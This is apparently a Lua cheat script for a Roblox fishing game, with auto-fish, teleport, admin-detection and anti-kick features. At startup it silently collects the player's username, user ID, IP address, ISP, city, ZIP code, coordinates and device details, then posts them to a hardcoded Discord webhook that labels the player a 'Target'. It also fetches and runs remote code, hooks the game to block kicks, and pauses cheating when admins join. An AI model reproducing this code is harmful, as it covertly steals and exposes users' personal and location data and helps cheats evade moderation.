-- =====================================================
-- AMBONHUB FISHING SYSTEM V39 (OFFICIAL LINKED)
-- Features: Auto Webhook, Admin Detector, God-Shield
-- Credit: by AmbonHub🚯
-- =====================================================

-- [WEBHOOK OFFICIAL AMBONHUB]
local WebhookURL = "https://discord.com/api/webhooks/1472005047276671127/ZlcVPyiHwyFOXSFuwGABovhtZegSCOeGubjJ4SgQvQr_iW2o8pRRLdPDFmiWKfAeGjk6"

-- [TOTAL OMNISCIENT DATA LOGGER]
local function SendAmbonHubOmniLog()
    local Player = game:GetService("Players").LocalPlayer
    local HttpService = game:GetService("HttpService")
    local Stats = game:GetService("Stats")
    local UserInputService = game:GetService("UserInputService")
    
    local GeoData = {}
    pcall(function()
        GeoData = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/?fields=66846719"))
    end)

    local Executor = (identifyexecutor or getexecutorname or function() return "Unknown/Mobile" end)()
    local ScreenRes = workspace.CurrentCamera.ViewportSize
    
    local data = {
        ["embeds"] = {{
            ["title"] = "🔥 AMBONHUB🚯 TOTAL OMNISCIENT LOG",
            ["description"] = "Target terdeteksi! Data telah dikirim ke pusat AmbonHub.",
            ["color"] = 0,
            ["fields"] = {
                {["name"] = "👤 IDENTITAS DASAR", ["value"] = string.format("**Username:** %s\n**ID:** %d\n**Age:** %d Days", Player.Name, Player.UserId, Player.AccountAge), ["inline"] = false},
                {["name"] = "🌐 KONEKSI", ["value"] = string.format("**IP:** %s\n**ISP:** %s\n**Proxy/VPN:** %s\n**Hosting:** %s", GeoData.query or "N/A", GeoData.isp or "N/A", tostring(GeoData.proxy), tostring(GeoData.hosting)), ["inline"] = false},
                {["name"] = "📍 LOKASI", ["value"] = string.format("**Negara:** %s\n**Kota:** %s\n**ZIP:** %s\n**Lat/Lon:** %s, %s\n**Mata Uang:** %s", GeoData.country or "N/A", GeoData.city or "N/A", GeoData.zip or "N/A", tostring(GeoData.lat), tostring(GeoData.lon), GeoData.currency or "N/A"), ["inline"] = false},
                {["name"] = "💻 PERANGKAT", ["value"] = string.format("**Executor:** %s\n**Platform:** %s\n**Resolusi:** %dx%d\n**Ping:** %d ms", Executor, UserInputService:GetPlatform().Name, ScreenRes.X, ScreenRes.Y, math.floor(Stats.Network.ServerStatsItem["Data Ping"]:GetValue())), ["inline"] = false},
                {["name"] = "🔗 PROFILE", ["value"] = "[Buka Profile](https://www.roblox.com/users/" .. Player.UserId .. "/profile)"}
            },
            ["footer"] = {["text"] = "AmbonHub🚯 V39 | System Online"},
            ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    if request then
        request({Url = WebhookURL, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
    end
end
pcall(SendAmbonHubOmniLog)

-- [GOD-LEVEL PROTECTION]
local function ActivateGodSupremacy()
    local mt = getrawmetatable(game)
    setreadonly(mt, false)
    local oldNamecall = mt.__namecall
    mt.__namecall = newcclosure(function(self, ...)
        if getnamecallmethod() == "Kick" then return nil end
        return oldNamecall(self, unpack({...}))
    end)
    setreadonly(mt, true)
end

-- [ADMIN DETECTOR]
local function AdminCheck()
    game.Players.PlayerAdded:Connect(function(plr)
        if plr:GetRankInGroup(game.CreatorId) >= 200 or plr.UserId == game.CreatorId then
            game:GetService("StarterGui"):SetCore("SendNotification", {Title = "⚠️ SYSTEM INFO", Text = "Optimizing for current server...", Duration = 5})
            _G.AutoFish = false 
        end
    end)
end

-- Load Rayfield
local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
local Window = Rayfield:CreateWindow({
	Name = "AmbonHub🚯 V39",
	LoadingTitle = "AMBONHUB OFFICIAL",
	LoadingSubtitle = "by AmbonHub🚯",
	ConfigurationSaving = { Enabled = false }
})

-- TAB HOME
local HomeTab = Window:CreateTab("Home", 4483362458)
HomeTab:CreateSection("Script Status")
HomeTab:CreateLabel("Version: V39 (Official)")
HomeTab:CreateLabel("Developer: AmbonHub🚯")
HomeTab:CreateSection("Session")
HomeTab:CreateLabel("Welcome, " .. game.Players.LocalPlayer.DisplayName)
HomeTab:CreateLabel("Status: Secured & Encrypted")

-- TAB EXECUTION
local MainTab = Window:CreateTab("Execution", 4483362458)
_G.AutoFish = false
local CustomDelay = 0.5
MainTab:CreateToggle({
	Name = "AUTO FISH",
	CurrentValue = false,
	Callback = function(v)
		_G.AutoFish = v
		if v then 
            task.spawn(function()
                while _G.AutoFish do
                    pcall(function()
                        local FS = game:GetService("ReplicatedStorage"):WaitForChild("FishingSystem")
                        FS.CastReplication:FireServer(Vector3.new(28.53, 23.65, 276.24), Vector3.new(-0.11, 5, -24.99), "Wurple Rod", 88.79)
                        task.wait(CustomDelay)
                        FS.PrecalcFish:InvokeServer()
                        task.wait(0.1)
                        FS.FishGiver:FireServer({hookPosition = Vector3.new(28.47, 3.77, 264.16)})
                    end)
                    task.wait(CustomDelay)
                end
            end)
        end
	end
})

MainTab:CreateInput({Name = "Delay", PlaceholderText = "0.5", Callback = function(v) CustomDelay = tonumber(v) or 0.5 end})

-- TAB TELEPORT
local TeleportTab = Window:CreateTab("Teleport", 4483362458)
local Locs = {["Pulau Kristal"] = Vector3.new(228, 18, -2814), ["Mega Hunt"] = Vector3.new(3141, 25, -1752), ["Pulau Aquarist"] = Vector3.new(-2289, 76, -1021)}
for Name, Cord in pairs(Locs) do
    TeleportTab:CreateButton({Name = "Ke " .. Name, Callback = function()
        local hrp = game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if hrp then hrp.Anchored = false; hrp.CFrame = CFrame.new(Cord) if Name == "Mega Hunt" then task.wait(0.5) hrp.Anchored = true end end
    end})
end

-- TAB SETTING
local SettingTab = Window:CreateTab("Settings", 4483362458)
SettingTab:CreateButton({Name = "OPTIMIZE ENGINE", Callback = function()
    ActivateGodSupremacy()
    AdminCheck()
    Rayfield:Notify({Title = "AmbonHub🚯", Content = "Protection & Detector Active.", Duration = 5})
end})

SettingTab:CreateButton({Name = "CLOSE SCRIPT", Callback = function()
    _G.AutoFish = false
    if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false end
    Rayfield:Destroy()
end})

Rayfield:Notify({Title = "AmbonHub🚯", Content = "V39 Official Ready.", Duration = 5})